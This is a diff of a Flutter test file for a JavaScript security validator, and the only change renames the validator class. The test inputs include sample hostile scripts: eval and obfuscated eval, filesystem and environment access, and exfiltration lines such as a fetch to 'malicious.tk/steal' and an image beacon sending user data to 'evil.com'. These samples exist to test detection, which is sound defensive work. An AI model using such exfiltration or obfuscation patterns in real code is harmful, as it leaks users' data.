@@ -5,7 +5,7 @@ import 'package:flutter_test/flutter_test.dart';
 import 'package:koyze/features/custom_source/domain/enhanced_script_validator.dart';
 
 void main() {
-  group('EnhancedSourceScriptValidator', () {
+  group('EnhancedScriptValidator', () {
     group('Dynamic Code Execution Detection', () {
       test('should reject eval() usage', () {
         final script = '''
@@ -14,7 +14,7 @@ void main() {
           }
         ''';
         
-        final result = EnhancedSourceScriptValidator.validate(script);
+        final result = EnhancedScriptValidator.validate(script);
         
         expect(result.isSecure, false);
         expect(
@@ -30,7 +30,7 @@ void main() {
           const fn = new Function('return 1 + 1');
         ''';
         
-        final result = EnhancedSourceScriptValidator.validate(script);
+        final result = EnhancedScriptValidator.validate(script);
         
         expect(result.isSecure, false);
         expect(result.criticalIssues.isNotEmpty, true);
@@ -41,7 +41,7 @@ void main() {
           window['eval']('malicious code');
         ''';
         
-        final result = EnhancedSourceScriptValidator.validate(script);
+        final result = EnhancedScriptValidator.validate(script);
         
         expect(result.isSecure, false);
       });
@@ -51,7 +51,7 @@ void main() {
           someObject['constructor']('alert(1)')();
         ''';
         
-        final result = EnhancedSourceScriptValidator.validate(script);
+        final result = EnhancedScriptValidator.validate(script);
         
         expect(result.highIssues.isNotEmpty, true);
       });
@@ -63,7 +63,7 @@ void main() {
           const env = process.env;
         ''';
         
-        final result = EnhancedSourceScriptValidator.validate(script);
+        final result = EnhancedScriptValidator.validate(script);
         
         expect(result.isSecure, false);
         expect(
@@ -79,7 +79,7 @@ void main() {
           const fs = require('fs');
         ''';
         
-        final result = EnhancedSourceScriptValidator.validate(script);
+        final result = EnhancedScriptValidator.validate(script);
         
         expect(result.isSecure, false);
       });
@@ -89,7 +89,7 @@ void main() {
           const buf = Buffer.from('data');
         ''';
         
-        final result = EnhancedSourceScriptValidator.validate(script);
+        final result = EnhancedScriptValidator.validate(script);
         
         expect(result.isSecure, false);
       });
@@ -103,7 +103,7 @@ void main() {
                       "\\u0074\\u0065\\u0073\\u0074\\u0069\\u006e\\u0067";
         ''';
         
-        final result = EnhancedSourceScriptValidator.validate(script);
+        final result = EnhancedScriptValidator.validate(script);
         
         expect(
           result.issues.any(
@@ -118,7 +118,7 @@ void main() {
           [][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]]
         ''';
         
-        final result = EnhancedSourceScriptValidator.validate(script);
+        final result = EnhancedScriptValidator.validate(script);
         
         expect(result.isSecure, false);
         expect(
@@ -134,7 +134,7 @@ void main() {
           const secret = "lave".split("").reverse().join("");
         ''';
         
-        final result = EnhancedSourceScriptValidator.validate(script);
+        final result = EnhancedScriptValidator.validate(script);
         
         expect(
           result.issues.any(
@@ -150,7 +150,7 @@ void main() {
           obj["method1"]()["method2"]()["method3"]()
         ''';
         
-        final result = EnhancedSourceScriptValidator.validate(script);
+        final result = EnhancedScriptValidator.validate(script);
         
         expect(
           result.issues.any(
@@ -169,7 +169,7 @@ void main() {
           const decoded = atob(payload);
         ''';
         
-        final result = EnhancedSourceScriptValidator.validate(script);
+        final result = EnhancedScriptValidator.validate(script);
         
         // High entropy string should trigger warning
         expect(result.metadata.containsKey('entropy'), true);
@@ -184,7 +184,7 @@ void main() {
           }
         ''';
         
-        final result = EnhancedSourceScriptValidator.validate(script);
+        final result = EnhancedScriptValidator.validate(script);
         final entropy = result.metadata['entropy'] as double;
         
         expect(entropy < 4.5, true);
@@ -198,7 +198,7 @@ void main() {
           fetch(url);
         ''';
         
-        final result = EnhancedSourceScriptValidator.validate(script);
+        final result = EnhancedScriptValidator.validate(script);
         
         expect(
           result.highIssues.any(
@@ -213,7 +213,7 @@ void main() {
           fetch("http://192.168.1.100/api");
         ''';
         
-        final result = EnhancedSourceScriptValidator.validate(script);
+        final result = EnhancedScriptValidator.validate(script);
         
         expect(
           result.issues.any(
@@ -228,7 +228,7 @@ void main() {
           fetch("https://malicious.tk/steal");
         ''';
         
-        final result = EnhancedSourceScriptValidator.validate(script);
+        final result = EnhancedScriptValidator.validate(script);
         
         expect(
           result.issues.any(
@@ -244,7 +244,7 @@ void main() {
           img.src = "https://evil.com/track?data=" + userData;
         ''';
         
-        final result = EnhancedSourceScriptValidator.validate(script);
+        final result = EnhancedScriptValidator.validate(script);
         
         expect(
           result.highIssues.any(
@@ -259,7 +259,7 @@ void main() {
       test('should reject oversized scripts', () {
         final script = 'x' * (2 * 1024 * 1024 + 1); // 2MB + 1
         
-        final result = EnhancedSourceScriptValidator.validate(script);
+        final result = EnhancedScriptValidator.validate(script);
         
         expect(result.isSecure, false);
         expect(
@@ -274,7 +274,7 @@ void main() {
         final script = '{{{{{{{{{{{{{{{{{{{{{{' + 
                        '}}}}}}}}}}}}}}}}}}}}}}'; // Deep nesting
         
-        final result = EnhancedSourceScriptValidator.validate(script);
+        final result = EnhancedScriptValidator.validate(script);
         
         expect(result.metadata['maxNestingDepth'], greaterThan(20));
       });
@@ -297,7 +297,7 @@ void main() {
           }
         ''';
         
-        final result = EnhancedSourceScriptValidator.validate(script);
+        final result = EnhancedScriptValidator.validate(script);
         
         expect(result.isSecure, true);
         expect(result.criticalIssues, isEmpty);
@@ -310,7 +310,7 @@ void main() {
           }
         ''';
         
-        final result = EnhancedSourceScriptValidator.validate(script);
+        final result = EnhancedScriptValidator.validate(script);
         
         expect(result.metadata['size'], greaterThan(0));
         expect(result.metadata['lines'], greaterThan(0));
